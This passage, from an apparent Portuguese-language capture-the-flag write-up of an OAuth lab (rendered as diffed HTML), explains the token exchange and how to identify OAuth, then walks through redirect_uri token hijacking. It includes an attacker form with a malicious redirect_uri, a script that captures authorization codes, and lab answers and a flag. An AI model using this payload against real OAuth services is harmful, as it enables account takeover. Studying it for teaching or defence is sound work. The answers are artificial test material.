+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	client_secret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Application&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CoffeeApp&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;client_secret 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	redirect_uri &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;redirect_uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://bistro.thm:8000/oauthdemo/callback&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;grant_type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authorization_code&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;: code, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;redirect_uri&amp;#34;&lt;/span&gt;: redirect_uri, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;client_id&amp;#34;&lt;/span&gt;: client_id, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;client_secret&amp;#34;&lt;/span&gt;: client_secret, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		} 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Authorization&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Basic &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;client_id&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;client_secret&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(token_url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers) tokens &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;json()&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Abaixo formato da requisição enviada pelo navegador.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/request_web_tools.png&#34; alt=&#34;request&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;resposta-do-token&#34;&gt;Resposta do token&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;resposta-do-token&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#resposta-do-token&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O servidor de autorização autentica o site do bistrô e valida o código de autorização. Após a validação bem-sucedida, o servidor responde com um &lt;code&gt;Access Token&lt;/code&gt; e opcionalmente com um &lt;code&gt;Refresh token&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Os campos que são incluídos na resposta do servidor de autorização.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;access_token&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;token_type&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;expires_in&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;refresh_token (optional)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Com isso o &lt;code&gt;bistro app&lt;/code&gt;pode realizar requisições autenticadas no servidor de recursos do &lt;code&gt;CoffeShopApp&lt;/code&gt;, em nome do usuário.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the cliend_id value after initiating the OAuth 2.0 workflow?&lt;/strong&gt;
+Respota: &lt;code&gt;zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What parameter name determines the time validity of a token in the token response?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;expires_in&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;identificando-serviços-de-oauth&#34;&gt;Identificando serviços de OAuth&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;identificando-serviços-de-oauth&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#identificando-servi%c3%a7os-de-oauth&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A primeira indicação de que um serviço utiliza OAuth pode ser observada em seu processo de login, onde são fornecidos serviços externos para realizar a autenticação, como por exemplo: Google, Facebook e GitHub. Esses serviços nos redirecionam para a página de autorização deles.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;implementações-de-oauth&#34;&gt;Implementações de OAuth&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;implementações-de-oauth&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#implementa%c3%a7%c3%b5es-de-oauth&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Analisando o tráfego de rede do processo de login, devemos prestar atenção nos redirecionamentos HTTP. O OAuth geralmente redireciona o navegador para a URL do servidor de autorização.&lt;/p&gt;
+&lt;p&gt;Essa URL frequentemente contém parâmetros específicos de consultas, como por exemplo.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;response_type&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;client_id&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;redirect_uri&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;scope&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;state&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Exemplo de URL&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;https://dev.coffee.thm/authorize?response_type=code&amp;amp;client_id=AppClientID&amp;amp;redirect_uri=https://dev.coffee.thm/callback&amp;amp;scope=profile&amp;amp;state=xyzSecure123&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3 data-hextra-search-id=&#34;framework-oauth&#34;&gt;Framework OAuth&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;framework-oauth&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#framework-oauth&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O próximo passo é identificar o framework ou a biblioteca específica que o aplicativo emprega. Isso pode fornecer informações valiosas para a descoberta de vulnerabilidades e para realizar uma avaliação de segurança apropriada. Aqui estão algumas estratégias para identificar o framework:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Cabeçalhos HTTP e respostas&lt;/code&gt;: Inspecionar cabeçalhos HTTP e o corpo das respostas, buscando comentários que especifiquem bibliotecas ou frameworks.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Análise do código fonte&lt;/code&gt;: Caso tenha acesso ao código fonte, buscar por palavras-chave ou bibliotecas.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Autorização e token do endpoint&lt;/code&gt;: Analisar os endpoints usados para obter códigos de autorização e tokens de acesso. Diferentes implementações de OAuth podem ter padrões ou estruturas de endpoint exclusivos.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Mensagens de erro&lt;/code&gt;: Mensagens de erro personalizadas e saídas de depuração podem revelar inadvertidamente a pilha de tecnologia subjacente.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;What is the name of the toolkit used for implementing Oauth in the URL &lt;code&gt;http://coffee.thm:8000/&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Sabemos que a aplicação está utilizando Django para implementar OAuth, na aula já é fornecido a resposta, e também podemos encontra-la facilmente realizando uma pesquisa na internet.&lt;br&gt;
+Resposta:&lt;code&gt;django-oauth-toolkit&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;roubando-token-oauth&#34;&gt;Roubando Token OAuth&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;roubando-token-oauth&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#roubando-token-oauth&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;O token possui um papel crucial para proteger os recursos. Conforme mencionado, ele é emitido pelo servidor de autorização e redirecionado para a aplicação cliente através do parâmetro &lt;code&gt;redirect_uri&lt;/code&gt;. Esse parâmetro, no entanto, nem sempre é bem protegido. Por meio dele, é possível realizar um ataque de &lt;code&gt;hijack tokens&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;papel-do-redirect_uri&#34;&gt;Papel do Redirect_uri&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;papel-do-redirect_uri&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#papel-do-redirect_uri&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Redirect_uri&lt;/code&gt; é um parâmetro específico no fluxo do OAuth. A URI desse parâmetro deve ser pré-registrada na aplicação, prevenindo assim vulnerabilidades no redirecionamento. Durante o processo de autenticação, o servidor verifica o valor fornecido pelo &lt;code&gt;redirect_uri&lt;/code&gt; e garante que ele corresponde às URIs registradas.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;vulnerabilidade&#34;&gt;Vulnerabilidade&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerabilidade&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerabilidade&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Um &lt;code&gt;redirect_uri&lt;/code&gt; inseguro pode levar a falhas de segurança graves. Por exemplo, se o atacante ganhar controle sobre um domínio ou URL listada no parâmetro, ele pode interceptar o código de autorização e, assim, solicitar um token de acesso.&lt;/p&gt;
+&lt;p&gt;Utilizaremos o exemplo a seguir, fornecido em aula, para entender melhor o conceito.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;realizando-ataque&#34;&gt;Realizando ataque&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;realizando-ataque&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#realizando-ataque&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;No &lt;code&gt;CoffeShopApp&lt;/code&gt;temos as seguintes URIs registradas.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/URI_registers.png&#34; alt=&#34;URI_registers&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;No exemplo, o atacante toma controle do domínio &lt;code&gt;dev.bistro.thm&lt;/code&gt; e consegue hospedar qualquer página HTML no servidor. Sendo assim, o atacante cria a página abaixo, onde há um link escondido que será enviado no parâmetro &lt;code&gt;redirect_uri&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://coffee.thm:8000/oauthdemo/oauth_login/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;get&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;redirect_uri&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://dev.bistro.thm:8002/malicious_redirect.html&amp;#34;&lt;/span&gt;&amp;gt; &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hijack OAuth&amp;#34;&lt;/span&gt;&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Será enviado o link &lt;code&gt;http://dev.bistro.thm:8002/malicious_redirect.html&lt;/code&gt;, em nosso parâmetro &lt;code&gt;redirect_uri&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/bistro_malicious.png&#34; alt=&#34;bistro_malicious&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Após a vítima clicar em &amp;ldquo;Login via OAuth&amp;rdquo;, será feita uma requisição para o link do &lt;code&gt;CoffeShopApp&lt;/code&gt;. A vítima então fornecerá suas credenciais para o servidor de autorização, que as verificará e, em seguida, redirecionará para a URI pré-registrada no servidor: &lt;code&gt;http://dev.bistro.thm:8002/malicious_redirect.html&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A página maliciosa realiza um parse na requisição, buscando o código de autorização e salvando-o em um banco de dados. Código abaixo&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Extract the authorization code from the URL 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;urlParams&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;URLSearchParams&lt;/span&gt;(window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;search&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;urlParams&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;code&amp;#39;&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auth_code&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;innerText&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Intercepted Authorization Code:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// code to save the acquired code in database/file etc &amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Após nos autenticar em &lt;code&gt;CoffeShopApp&lt;/code&gt;e autorizar, somos redirecionados, e obtemos o código de autorização.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/cod_auth.png&#34; alt=&#34;code_auth&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;O endpoint &lt;code&gt;/callback&lt;/code&gt; sempre está disponível. Com o código de autorização em mãos, podemos solicitar um token de acesso.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Endpoint:&lt;/strong&gt; &lt;code&gt;http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxx&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Nosso código:&lt;/strong&gt; &lt;code&gt;Mra1NAHSQyndd9M4vPfi1n4qFUubCf&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/callback.png&#34; alt=&#34;callback&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the flag value after getting the access token?&lt;/strong&gt;&lt;br&gt;
+Reposta:&lt;code&gt;THM{GOT_THE_TOKEN007}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;csrf-no-oauth&#34;&gt;CSRF no OAuth&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;csrf-no-oauth&#34;&gt;&lt;/span&gt;
